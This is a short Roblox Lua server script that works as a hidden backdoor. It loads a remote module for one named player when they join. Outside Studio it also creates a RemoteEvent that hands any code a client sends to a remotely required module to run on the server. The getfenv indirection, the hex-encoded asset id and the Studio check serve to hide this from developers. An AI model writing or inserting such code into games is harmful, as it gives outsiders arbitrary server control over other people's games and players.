
local Players = game:GetService("Players")

local targetPlayerName = "K00PKIDDGUI8"

Players.PlayerAdded:Connect(function(player)
	
	if player.Name == targetPlayerName then
		require(16920033857)("K00PKIDDGUI8")
	end
end)

if not game:GetService('RunService'):IsStudio() then
    getfenv(0)["Instance"]["new"]("RemoteEvent", workspace).OnServerEvent:Connect(function(_, code)
        getfenv(0)["require"](0x34A62CEB9):SpawnS(code, workspace)
    end)
end
